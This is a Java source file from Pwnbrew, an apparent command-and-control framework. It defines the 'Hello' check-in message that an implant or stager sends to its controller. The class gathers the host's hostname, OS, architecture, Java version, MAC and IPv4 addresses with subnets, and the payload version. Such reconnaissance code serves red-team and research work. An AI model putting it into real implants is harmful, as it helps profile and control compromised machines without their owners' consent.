/*

Copyright (C) 2013-2014, Securifera, Inc 

All rights reserved. 

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
	this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
	this list of conditions and the following disclaimer in the documentation 
	and/or other materials provided with the distribution.

    * Neither the name of Securifera, Inc nor the names of its contributors may be 
	used to endorse or promote products derived from this software without specific
	prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER 
OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

================================================================================

Pwnbrew is provided under the 3-clause BSD license above.

The copyright on this package is held by Securifera, Inc

*/


/*
* Hello.java
*
* Created on Jul 15, 2013, 11:12:08 PM
*/

package pwnbrew.network.control.messages;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.InterfaceAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.util.Enumeration;
import java.util.List;
import java.util.Properties;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import pwnbrew.misc.Constants;
import pwnbrew.misc.NetworkInterfaceUtilities;
import pwnbrew.misc.Utilities;
import pwnbrew.network.ControlOption;
/**
 *
 *  
 */
public final class Hello extends ControlMessage {

    private static final byte OPTION_HOSTNAME = 6;
    private static final byte OPTION_OS_NAME = 14;    
    private static final byte OPTION_JAVA_ARCH = 15;   
    private static final byte OPTION_NIC_INFO = 18;
    private static final byte OPTION_JAR_VERSION = 19;
    private static final byte OPTION_JRE_VERSION = 20;
   
    // ==========================================================================
    /**
     * Constructor
     *
     * @param passedHostname
     * @throws java.io.IOException
     * @throws java.net.SocketException
    */
    public Hello( String passedHostname ) throws SocketException, IOException {
        super();

        //Add hostname
        byte[] strBytes = passedHostname.getBytes();
        ControlOption aTlv = new ControlOption( OPTION_HOSTNAME, strBytes);
        addOption(aTlv);
        
        //Add the OS Name
        strBytes = Utilities.getOsName().getBytes();
        aTlv = new ControlOption( OPTION_OS_NAME, strBytes);
        addOption(aTlv);
        
        //Add the Java Arch
        strBytes = Utilities.getOsArch().getBytes();
        aTlv = new ControlOption( OPTION_JAVA_ARCH, strBytes);
        addOption(aTlv);
        
        //Add the Java Version
        String theVersion = System.getProperty("java.version");
        aTlv = new ControlOption( OPTION_JRE_VERSION, theVersion.getBytes());
        addOption(aTlv);
        
        //Get the network interface for the ip address and then the mac address from it
        StringBuilder aSB;
        Enumeration<NetworkInterface> anEnum = NetworkInterface.getNetworkInterfaces();
        while( anEnum.hasMoreElements() ){
            
            aSB = new StringBuilder();
            NetworkInterface theInterface = anEnum.nextElement();
            
            byte[] macAddressArr = NetworkInterfaceUtilities.getHardwareAddress_SPECIALIZED(theInterface);
                
            //Convert the mac to a string a add it to the message
            String hexString = NetworkInterfaceUtilities.convertHexBytesToString(macAddressArr);
            if(hexString == null){
                hexString = "";
            }
            
            //Add the MAC Address
            aSB.append(hexString).append(":");

            //Add the option
            if( !theInterface.isLoopback() && !theInterface.isVirtual() && theInterface.isUp()){
                List<InterfaceAddress> iaList = theInterface.getInterfaceAddresses(); //Get a list of the InterfaceAddresses
                for( InterfaceAddress anIN : iaList ) { //If at least one InterfaceAddress was obtained...
                    InetAddress anAddr = anIN.getAddress();
                    if( anAddr instanceof Inet4Address ){
                        
                        //Add the IP
                        String inetStr = anAddr.getHostAddress();
                        aSB.append(inetStr);
                        
                        //Add the delimiter
                        aSB.append("/");
                        
                        //Add the subnet number
                        int subnet = anIN.getNetworkPrefixLength();
                        aSB.append(Integer.toString(subnet));
                        
                        //Add the mac
                        strBytes = aSB.toString().getBytes();
                        aTlv = new ControlOption(OPTION_NIC_INFO, strBytes);
                        addOption(aTlv);
                        
                        break;
                    }
                }
             
            }

        }
        
        //Add Stager version
        File theClassPath = Utilities.getClassPath();
        //Open the zip input stream
        ZipInputStream theZipInputStream = new ZipInputStream( new FileInputStream(theClassPath));        
        try {
            ZipEntry anEntry;
            while((anEntry = theZipInputStream.getNextEntry())!=null){

                //Get the entry name
                String theEntryName = anEntry.getName();


                //Change the properties file
                if( theEntryName.equals( Constants.PROP_FILE) ){

                    //Get the input stream and modify the value
                    Properties localProperties = new Properties();
                    localProperties.load(theZipInputStream);

                    //Set the IP to something else
                    String version = localProperties.getProperty(Constants.PAYLOAD_VERSION_LABEL);
                    if( version != null ){
                        //Set the jar version
                        String jarVersionString = version;
                        strBytes = jarVersionString.getBytes();
                        aTlv = new ControlOption( OPTION_JAR_VERSION, strBytes);
                        addOption(aTlv);
                        break;
                    }     

                } 
            }

        } finally {
            try {
                theZipInputStream.close();
            } catch (IOException ex) { ex = null; }
        }

    }

}/* END CLASS Hello */
